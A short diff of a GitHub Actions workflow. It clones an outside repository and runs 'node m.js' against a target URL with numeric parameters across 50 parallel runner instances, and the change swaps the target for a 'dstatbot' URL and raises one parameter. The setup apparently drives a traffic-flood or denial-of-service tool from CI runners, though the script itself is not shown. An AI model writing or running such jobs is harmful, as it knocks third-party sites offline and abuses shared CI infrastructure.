@@ -34,8 +34,9 @@ jobs:
         run: |
           git clone https://github.com/vrbrh921-glitch/Fc.git
           cd Fc
-          node m.js https://ravanviphaxx.ai-new.xyz/ 300 1 1 2
+          node m.js https://captcha.dstatbot.win/u6c8zjEB 700 1 1 1
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 50
           RUNNER_OS: ubuntu
+
